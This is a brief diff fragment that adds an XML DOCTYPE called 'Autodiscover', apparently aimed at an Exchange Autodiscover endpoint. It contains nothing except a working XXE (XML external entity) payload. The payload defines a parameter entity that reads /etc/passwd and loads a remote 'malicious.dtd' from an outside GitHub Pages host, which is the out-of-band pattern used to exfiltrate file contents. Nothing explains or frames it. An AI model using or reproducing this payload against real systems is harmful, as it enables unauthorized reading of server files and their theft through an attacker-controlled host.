@@ -1,0 +1,6 @@
+<!DOCTYPE Autodiscover [
+  <!ENTITY % xxe SYSTEM "file:///etc/passwd"> 
+  <!ENTITY % all "<!ENTITY % remote SYSTEM ' https://zerox-404.github.io/Epensite/malicious.dtd'>">
+  %all;
+  %remote;
+]>
